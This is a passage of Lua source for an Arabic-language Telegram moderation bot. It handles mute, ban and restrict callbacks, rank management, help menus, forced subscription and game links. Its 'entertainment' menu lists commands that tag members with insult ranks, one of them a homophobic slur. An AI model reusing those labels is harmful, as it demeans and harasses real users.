data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ 𝑆𝐸𝑁𝐷 𝑇𝐻𝐸 𝑁𝐴𝑀𝐸 𝑂𝐹 𝑊𝐻𝐴𝑇 𝑌𝑂𝑈 𝑊𝐴𝑁𝑇 𝑇𝑂 𝐷𝑂𝑊𝑁𝐿𝑂𝐴𝐷 𝐴𝑁𝐷 𝑇𝐻𝐸 𝐵𝑂𝑇 𝑊𝐼𝐿𝐿 𝑆𝐸𝑁𝐷 𝐼𝑇 𝑇𝑂 𝑌𝑂𝑈 𝐻𝐸𝑅𝐸 .
*]]
Redis:set(darket.."youtube"..IdUser..ChatId,'mp4')
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/onlinebott(.*)') then
local UserId = {Text:match('(%d+)/onlinebott(.*)')}
local Get_Chat = LuaTele.getChat(ChatId)
local Info_Chats = LuaTele.getSupergroupFullInfo(ChatId)
if tonumber(IdUser) == tonumber(UserId[1]) then
Redis:sadd(darket.."ChekBotAdd",UserId[2])
local U = LuaTele.getUser(IdUser)
Redis:set(darket.."Status:Id"..UserId[2],true) ;Redis:del(darket.."Status:Reply"..UserId[2]) ;Redis:del(darket.."Status:ReplySudo"..UserId[2]) ;Redis:set(darket.."Status:BanId"..UserId[2],true) ;Redis:set(darket.."Status:SetId"..UserId[2],true) 
local Info_Members = LuaTele.getSupergroupMembers(UserId[2], "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
y = 0
for k, v in pairs(List_Members) do
if Info_Members.members[k].bot_info == nil then
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
Redis:sadd(darket.."Owners:Group"..UserId[2],v.member_id.user_id) 
x = x + 1
else
Redis:sadd(darket.."Admin:Group"..UserId[2],v.member_id.user_id) 
y = y + 1
end
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- مغادرة المجموعه ', data = '/leftgroup@'..ChatId}, 
},
{
{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}, 
},
}
}
send(Sudo_Id,0,'*\n٠ تم تفعيل مجموعه جديده \n٠من قام بتفعيلها : {*['..U.first_name..'](tg://user?id='..IdUser..')*} \n٠معلومات المجموعه :\n٠عدد الاعضاء : '..Info_Chats.member_count..'\n٠عدد الادمنيه : '..Info_Chats.administrator_count..'\n٠عدد المطرودين : '..Info_Chats.banned_count..'\n٠ عدد المقيدين : '..Info_Chats.restricted_count..'*',"md",true, false, false, false, reply_markup)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '', url="t.me/R125R"},
},
}
local txxt = "٠ تم تفعيل المجموعه و ترقيه {"..y.."} ادمنيه \n٠️︙تم ترقية المالك "
local mm = Msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/EditMessagecaption?chat_id='..ChatId..'&message_id='..mm..'&caption=' .. URL.escape(txxt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if Text and Text:match('(%d+)mute(%d+)') then
local UserId = {Text:match('(%d+)mute(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(IdUser) == tonumber(UserId[1]) then
Redis:sadd(darket.."SilentGroup:Group"..ChatId,replyy) 
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء كتم', data = IdUser..'unmute'..replyy}, 
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = Reply_Status(replyy,"٠ تم كتمه في الكروب  ").Reply
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)unmute(%d+)') then
local UserId = {Text:match('(%d+)unmute(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(IdUser) == tonumber(UserId[1]) then
Redis:srem(darket.."SilentGroup:Group"..ChatId,replyy) 
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = Reply_Status(replyy,"٠ تم الغاء كتمه في الكروب ").Reply
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)ban(%d+)') then
local UserId = {Text:match('(%d+)ban(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(IdUser) == tonumber(UserId[1]) then
Redis:sadd(darket.."BanGroup:Group"..ChatId,replyy) 
LuaTele.setChatMemberStatus(ChatId,replyy,'banned',0)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء حظر', data = IdUser..'unban'..replyy}, 
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = Reply_Status(replyy,"٠ تم حظر من الكروب  ").Reply
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)unban(%d+)') then
local UserId = {Text:match('(%d+)unban(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(IdUser) == tonumber(UserId[1]) then
Redis:srem(darket.."BanGroup:Group"..ChatId,replyy) 
LuaTele.setChatMemberStatus(ChatId,replyy,'restricted',{1,1,1,1,1,1,1,1,1})
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = Reply_Status(replyy,"٠ تم الغاء حظره من الكروب ").Reply
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)kid(%d+)') then
local UserId = {Text:match('(%d+)kid(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(IdUser) == tonumber(UserId[1]) then
LuaTele.setChatMemberStatus(ChatId,replyy,'restricted',{1,0,0,0,0,0,0,0,0})
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء تقييد', data = IdUser..'unkid'..replyy}, 
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = Reply_Status(replyy,"٠ تم تقييده في الكروب  ").Reply
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)unkid(%d+)') then
local UserId = {Text:match('(%d+)unkid(%d+)')}
local replyy = tonumber(UserId[2])
print(replyy)
if tonumber(IdUser) == tonumber(UserId[1]) then
LuaTele.setChatMemberStatus(ChatId,replyy,'restricted',{1,1,1,1,1,1,1,1})
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = Reply_Status(replyy,"٠ تم الغاء تقييده في الكروب ").Reply
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text == 'صحيح' then
local UserInfo = LuaTele.getUser(IdUser)
local Teext = '- [*'..FlterBio(UserInfo.first_name)..'*](tg://user?id='..IdUser..') \n*• احسنت اجابتك صحيحه تم اضافه لك 3 نقطه*'
Redis:incrby(darket.."Num:Add:Games"..ChatId..IdUser,3)  
return edit(ChatId,Msg_id,Teext, 'md')
elseif Text == 'غلط' then
local UserInfo = LuaTele.getUser(IdUser)
local Teext = '- ['..FlterBio(UserInfo.first_name)..'](tg://user?id='..IdUser..') \n• للاسف اجابتك خاطئه !!'
return edit(ChatId,Msg_id,Teext, 'md')
end
if Text == 'صحيح1' then
local UserInfo = LuaTele.getUser(IdUser)
local Teext = '- [*'..FlterBio(UserInfo.first_name)..'*](tg://user?id='..IdUser..') \n*• احسنت اجابتك صحيحه تم اضافه لك 3 نقطه*'
Redis:incrby(darket.."Num:Add:Games"..ChatId..IdUser,3)  
return edit(ChatId,Msg_id,Teext, 'md')
elseif Text == 'غلط1' then
local UserInfo = LuaTele.getUser(IdUser)
local Teext = '- ['..FlterBio(UserInfo.first_name)..'](tg://user?id='..IdUser..') \n• للاسف اجابتك خاطئه !!'
return edit(ChatId,Msg_id,Teext, 'md')
end
if Text and Text:match('(%d+)/deldev/(%d+)') then
local info = {Text:match('(%d+)/deldev/(%d+)')}
if tonumber(info[1]) ~= tonumber(IdUser) then
return LuaTele.answerCallbackQuery(data.id, "٠ هذا الامر لا يخصك ", true)
end
Redis:srem(darket.."Dev:Groups",info[2])
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'back', data = IdUser..'/xnxxxxx'}, 
},
}
}
local txx = Reply_Status(info[2],"٠ تم تنزيله مطور ").Reply
edit(ChatId,Msg_id,txx, 'md', true, false, reply_markup)
end
if Text and Text:match('(%d+)/xnxxxxx') then
local info = Text:match('(%d+)/xnxxxxx')
if tonumber(info) ~= tonumber(IdUser) then
return LuaTele.answerCallbackQuery(data.id, "٠ هذا الامر لا يخصك ", true)
end
local Info_Members = Redis:smembers(darket.."Dev:Groups") 
if #Info_Members == 0 then
LuaTele.editMessageText(ChatId,Msg_id,"٠ لا يوجد مطورين حاليا ")  
return false 
end
local datar = {data = {{text = "مسح المطورين" , data = IdUser..'/Dev'}}}
for i = 1,#Info_Members do
infoo = LuaTele.getUser(Info_Members[i])
datar[i] = {{text = infoo.first_name , data =IdUser..'/deldev/'..Info_Members[i]}}
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = datar
}
local txx = '٠ قائمه مطورين البوت'
LuaTele.editMessageText(ChatId,Msg_id,txx, 'md', true, false, reply_markup)
end
if Text and Text:match('(%d+)/Nzlne') then
local UserId = Text:match('(%d+)/Nzlne')
if tonumber(IdUser) == tonumber(UserId) then
Redis:srem(darket.."Special:Group"..ChatId,IdUser)
Redis:srem(darket.."Admin:Group"..ChatId,IdUser)
Redis:srem(darket.."Manger:Group"..ChatId,IdUser)
Redis:srem(darket.."Creator:Group"..ChatId,IdUser)
Redis:srem(darket.."SuperCreator:Group"..ChatId,IdUser)
Redis:srem(darket.."Dev:Groups",IdUser) 
Redis:srem(darket.."Ownerss:Group"..ChatId,IdUser)
return edit(ChatId,Msg_id,"\n• تم تنزيلك من جميع الرتب", 'md')
end
end
if Text and Text:match('(%d+)/noNzlne') then
local UserId = Text:match('(%d+)/noNzlne')
if tonumber(IdUser) == tonumber(UserId) then
return edit(ChatId,Msg_id,"\n• تم الغاء عمليه التنزيل", 'md')
end
end

if Text and Text:match('(%d+)/statusSuperCreatorz/(%d+)') and data.Ownerss then
local UserId = {Text:match('(%d+)/statusSuperCreatorz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(darket.."SuperCreator:Group"..ChatId,UserId[2]) then
Redis:srem(darket.."SuperCreator:Group"..ChatId,UserId[2])
else
Redis:sadd(darket.."SuperCreator:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end

if Text and Text:match('(%d+)/statusCreatorz/(%d+)') and data.SuperCreator then
local UserId = {Text:match('(%d+)/statusCreatorz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then 
if Redis:sismember(darket.."Creator:Group"..ChatId,UserId[2]) then
Redis:srem(darket.."Creator:Group"..ChatId,UserId[2])
else
Redis:sadd(darket.."Creator:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end

if Text and Text:match('(%d+)/statusMangerz/(%d+)') and data.Creator then
local UserId = {Text:match('(%d+)/statusMangerz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(darket.."Manger:Group"..ChatId,UserId[2]) then
Redis:srem(darket.."Manger:Group"..ChatId,UserId[2])
else
Redis:sadd(darket.."Manger:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end

if Text and Text:match('(%d+)/statusAdminz/(%d+)') and data.Manger then
local UserId = {Text:match('(%d+)/statusAdminz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(darket.."Admin:Group"..ChatId,UserId[2]) then
Redis:srem(darket.."Admin:Group"..ChatId,UserId[2])
else
Redis:sadd(darket.."Admin:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end

if Text and Text:match('(%d+)/statusSpecialz/(%d+)') and data.Admin then
local UserId = {Text:match('(%d+)/statusSpecialz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(darket.."Special:Group"..ChatId,UserId[2]) then
Redis:srem(darket.."Special:Group"..ChatId,UserId[2])
else
Redis:sadd(darket.."Special:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end

if Text and Text:match('(%d+)/statusmem/(%d+)') and data.Ownerss then
local UserId ={ Text:match('(%d+)/statusmem/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
Redis:srem(darket.."Special:Group"..ChatId,UserId[2])
Redis:srem(darket.."Admin:Group"..ChatId,UserId[2])
Redis:srem(darket.."Manger:Group"..ChatId,UserId[2])
Redis:srem(darket.."Creator:Group"..ChatId,UserId[2])
Redis:srem(darket.."SuperCreator:Group"..ChatId,UserId[2])
Redis:srem(darket.."SilentGroup:Group"..ChatId,UserId[2])
Redis:srem(darket.."BanGroup:Group"..ChatId,UserId[2])
LuaTele.setChatMemberStatus(ChatId,UserId[2],'restricted',{1,1,1,1,1,1,1,1,1})
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusban/(%d+)') and data.Admin then
local UserId ={ Text:match('(%d+)/statusban/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if StatusCanOrNotCan(ChatId,UserId[2]) then
return LuaTele.answerCallbackQuery(data.id,"\n• عذرآ لا تستطيع استخدام الامر على { "..Controller(ChatId,UserId[2]).." } ", true)
end
if Redis:sismember(darket.."BanGroup:Group"..ChatId,UserId[2]) then
Redis:srem(darket.."BanGroup:Group"..ChatId,UserId[2])
LuaTele.setChatMemberStatus(ChatId,UserId[2],'restricted',{1,1,1,1,1,1,1,1,1})
else
Redis:sadd(darket.."BanGroup:Group"..ChatId,UserId[2])
LuaTele.setChatMemberStatus(ChatId,UserId[2],'banned',0)
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusktm/(%d+)') and data.Admin then
local UserId ={ Text:match('(%d+)/statusktm/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if StatusSilent(ChatId,UserId[2]) then
return LuaTele.answerCallbackQuery(data.id, "\n• عذرآ لا تستطيع استخدام الامر على { "..Controller(ChatId,UserId[2]).." } ", true)
end
if Redis:sismember(darket.."SilentGroup:Group"..ChatId,UserId[2]) then
Redis:srem(darket.."SilentGroup:Group"..ChatId,UserId[2])
else
Redis:sadd(darket.."SilentGroup:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('/delAmr1') then
local UserId = Text:match('/delAmr1')
if data.Admin then
return LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
end
end
if Text and Text:match('(%d+)/help1') then
local UserId = Text:match('(%d+)/help1')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '２', data = IdUser..'/help2'}, 
},
{
{text = '３', data = IdUser..'/help3'}, {text = '４', data = IdUser..'/help4'}, 
},
{
{text = '５', data = IdUser..'/help5'}, {text = '６', data = IdUser..'/help7'}, 
},
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ اوامر الحمايه اتبع مايلي ...
– – – – – – – –
٠ قفل ، فتح ٠ الامر 
٠ تستطيع قفل حمايه كما يلي ...
٠٠ بالتقييد ، بالطرد ، بالكتم 
– – – – – – – –
٠ الروابط
٠ المعرف
٠ التاك
٠ الشارحه
٠ التعديل
٠ التثبيت
٠ المتحركه
٠ الملفات
٠الصور
– – – – – – – –
٠ الماركداون
٠ البوتات
٠ التكرار
٠ الكلايش
٠ السيلفي
٠ الملصقات
٠ الفيديو
٠ الانلاين
٠ الدردشه
– – – – – – – –
٠ القناه
٠ التوجيه
٠ الاغاني
٠ الصوت
٠ الجهات
٠ الاشعارات
*]]
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help2') then
local UserId = Text:match('(%d+)/help2')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '１', data = IdUser..'/help1'}, 
},
{
{text = '３', data = IdUser..'/help3'}, {text = '４', data = IdUser..'/help4'}, 
},
{
{text = '５', data = IdUser..'/help5'}, {text = '６', data = IdUser..'/help7'}, 
},
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ اوامر ادمنية الكروب ...
– – – – – – – –
٠ رفع، تنزيل ٠ مميز
٠تاك للكل ، عدد الكروب
٠ كتم ، حظر ، طرد ، تقييد
٠ الغاء كتم ، الغاء حظر ، الغاء تقييد
٠ منع ، الغاء منع 
– – – – – – – –
٠ عرض القوائم كما يلي ...
– – – – – – – –
٠ المكتومين
٠ المميزين 
٠ قائمه المنع
– – – – – – – –
٠ تثبيت ، الغاء تثبيت
٠ الرابط ، الاعدادات
٠ الترحيب ، القوانين
٠ تفعيل ، تعطيل ٠ الترحيب
٠ تفعيل ، تعطيل ٠ الرابط
٠ جهاتي ،ايدي ، رسائلي
٠ تعديلاتي ، نقاطي
٠ كشف البوتات
– – – – – – – –
٠ وضع ، ضع ٠ الاوامر التاليه 
٠ اسم ، رابط ، صوره
٠ قوانين ، وصف ، ترحيب
– – – – – – – –
٠ حذف ، مسح ٠ الاوامر التاليه
٠ قائمه المنع ، المحظورين 
٠ المميزين ، المكتومين ، القوانين
٠ المطرودين ، البوتات ، الصوره
٠ الرابط
*]]
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)toar') then
local UserId = Text:match('(%d+)toar')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ ارسل النص لترجمته الي العربيه
*]]
Redis:set(darket.."toar"..IdUser,"on")
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)toen') then
local UserId = Text:match('(%d+)toen')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ ارسل النص لترجمته الي الانجليزيه
*]]
Redis:set(darket.."toen"..IdUser,"on")
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/setallmember') then
local UserId = Text:match('(%d+)/setallmember')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'عوده', data = IdUser..'/chback'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ تم تفعيل وضع الاشتراك الاجباري لكل الاعضاء
*]]
Redis:set(darket.."chmembers","on")
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/setforcmd') then
local UserId = Text:match('(%d+)/setforcmd')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'عوده', data = IdUser..'/chback'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ تم تفعيل وضع الاشتراك الاجباري علي اوامر البوت فقط مثل (الحظر/الكتم الخ..)
*]]
Redis:del(darket.."chmembers")
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/chback') then
local UserId = Text:match('(%d+)/chback')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '1', data = IdUser..'/setallmember'},{text = '2', data = IdUser..'/setforcmd'},
},
}
}
local TextHelp = '٠ اختار كيف تريد تفعيله \n٠ 1 : وضع الاشتراك الاجباري لكل الاعضاء \n٠ 2 : وضع الاشتراك الاجباري عند استخدام الاوامر فقط \n'
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help3') then
local UserId = Text:match('(%d+)/help3')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '１', data = IdUser..'/help1'}, {text = '２', data = IdUser..'/help2'}, 
},
{
{text = '４', data = IdUser..'/help4'}, 
},
{
{text = '５', data = IdUser..'/help5'}, {text = '６', data = IdUser..'/help7'}, 
},
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ اوامر المدراء في الكروب
– – – – – – – –
٠ رفع ، تنزيل ٠ ادمن
٠ الادمنيه 
٠ رفع، كشف ٠ القيود
٠ تنزيل الكل ٠ بالرد ، بالمعرف
– – – – – – – –
٠ لتغيير رد الرتب في البوت
– – – – – – – –
٠ تغيير رد ٠ اسم الرتبه والنص
٠ المطور ، المنشئ الاساسي
٠ المنشئ ، المدير ، الادمن
٠ المميز ، العضو
– – – – – – – –
٠ تفعيل ، تعطيل ٠ الاوامر التاليه ↓
– – – – – – – –
٠ الايدي ، الايدي بالصوره
٠ الردود العامه ، الردود
٠ اطردني ، الالعاب ، الرفع
٠ الحظر ، الرابط 
– – – – – – – –
٠ تعين ، مسح ٠الايدي 
٠ رفع الادمنيه ، مسح الادمنيه
٠ الردود ، مسح الردود
٠ اضف ، حذف ٠  رد 
٠ مسح ٠ عدد 
٠ ضع اسم ٠ لتغيير اسم المجموعه
*]]
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help4') then
local UserId = Text:match('(%d+)/help4')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '１', data = IdUser..'/help1'}, {text = '２', data = IdUser..'/help2'}, 
},
{
{text = '３', data = IdUser..'/help3'}, 
},
{
{text = '５', data = IdUser..'/help5'}, {text = '６', data = IdUser..'/help7'}, 
},
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ اوامر المنشئ الاساسي
– – – – – – – –
٠ رفع ، تنزيل ٠ منشئ 
٠ المنشئين ، مسح المنشئين
– – – – – – – –
٠ اوامر المنشئ الكروب
– – – – – – – –
٠ رفع ، تنزيل ٠  مدير
٠ المدراء ، مسح المدراء
٠ اضف رسائل ٠  بالرد او الايدي
٠ اضف نقاط ٠  بالرد او الايدي
٠ اضف ، حذف ٠ امر
٠ الاوامر المضافه ، مسح الاوامر المضافه
*]]
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help5') then
local UserId = Text:match('(%d+)/help5')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '１', data = IdUser..'/help1'}, {text = '２', data = IdUser..'/help2'}, 
},
{
{text = '３', data = IdUser..'/help3'}, {text = '４', data = IdUser..'/help4'}, 
},
{
{text = '６', data = IdUser..'/help7'}, 
},
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ اوامر المطور الاساسي
– – – – – – – –
٠ حظر عام ، الغاء العام
٠ اضف ، حذف ٠ مطور
٠ قائمه العام ، مسح قائمه العام
٠ المطورين ، مسح المطورين
– – – – – – – –
٠ اضف ، حذف ٠  رد عام 
٠وضع ، حذف ٠ كليشه المطور
٠ مسح الردود العامه ، الردود العامه
٠ تعين عدد الاعضاء ٠ العدد
٠ تحديث
– – – – – – – –
٠ تفعيل ، تعطيل ٠  الاوامر التاليه ↓
٠ البوت الخدمي ، المغادرة ، الاذاعه
– – – – – – – –
٠ اوامر المطور في البوت
– – – – – – – –
٠ تفعيل ، تعطيل ، الاحصائيات
٠ رفع، تنزيل ٠ منشئ اساسي
٠ رفع، تنزيل ٠ مالك
٠ مسح الاساسين ، المنشئين الاساسين
٠ غادر ٠ الايدي
٠ اذاعه ، اذاعه بالتوجيه ، اذاعه بالتثبيت
٠ اذاعه خاص ، اذاعه خاص بالتوجيه
*]]
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help7') then
local UserId = Text:match('(%d+)/help7')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '１', data = IdUser..'/help1'}, {text = '２', data = IdUser..'/help2'}, 
},
{
{text = '３', data = IdUser..'/help3'}, {text = '４', data = IdUser..'/help4'}, 
},
{
{text = '５', data = IdUser..'/help5'}, 
},
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ اوامر التسلية
– – – – – – – –
٠ رفع ، تنزيل ٠ الاوامر التاليه ↓
– – – – – – – –
٠ غبي 
٠ سمب
٠ حمار
٠ خول
٠ قرد 
٠ عره
٠ متوحد
٠ متوحده
٠ كلب 
– – – – – – – –
٠ اوامر التاك 
– – – – – – – –
٠ الاغبياء
٠ الحمير
٠ الخولات
٠ السمب
٠ المتوحدين
٠ الكلاب
٠ العرر
٠ القرود
– – – – – – – –
٠ اوامر الترفيه 
– – – – – – – –
٠ زخرفه
٠ حساب العمر
٠ اسمي
٠ البايو
٠ الوقت
٠ التاريخ
٠ ابراج
٠ تحميل انستا من خلال الامر `انستا`
٠ معني + الاسم 
٠ مثال معني ستيفن
٠ انصحني 
٠ دوله + واتبع التعليمات
*]]
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help6') then
local UserId = Text:match('(%d+)/help6')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'العاب السورس ™️', data = IdUser..'/normgm'}, {text = 'العاب متطورة 🎳', data = IdUser..'/degm'}, 
},
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ أهلا بك في قائمة العاب سورس داركت اختر نوع الالعاب 
*]]
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/degm') then
local UserId = Text:match('(%d+)/degm')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- فلابي بيرد', url = 'https://t.me/awesomebot?game=FlappyBird'}, 
},
{
{text = '- تبديل النجوم ', url = 'https://t.me/gamee?game=Switchy'}, {text = '- موتسيكلات', url = 'https://t.me/gamee?game=motofx'}, 
},
{
{text = '- اطلاق النار ', url = 'https://t.me/gamee?game=NeonBlaster'}, {text = '- كره القدم', url = 'https://t.me/gamee?game=Footballstar'}, 
},
{
{text = '- تجميع الوان ', url = 'https://t.me/awesomebot?game=Hextris'}, {text = '- المجوهرات', url = 'https://t.me/gamee?game=DiamondRows'}, 
},
{
{text = '- ركل الكرة ', url = 'https://t.me/gamee?game=KeepitUP'}, {text = '- بطولة السحق', url = 'https://t.me/gamee?game=SmashRoyale'}, 
},
{
{text = '- 2048', url = 'https://t.me/awesomebot?game=g2048'}, 
},
{
{text = '- كرة السلة ', url = 'https://t.me/gamee?game=BasketBoy'}, {text = '- القط المجنون', url = 'https://t.me/gamee?game=CrazyCat'}, 
},
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ مرحبا بك في الالعاب المتطورة الخاص بسورس داركت 
٠ اختر اللعبه ثم اختار المحادثة التي تريد اللعب بها
*]]
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/normgm') then
local UserId = Text:match('(%d+)/normgm')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ قائمه الالعاب البوت
– – – – – – – –
٠ لعبة المختلف ٠ المختلف
٠ لعبة الامثله ٠ امثله
٠ لعبة العكس ٠ العكس
٠ لعبة الحزوره ٠ حزوره
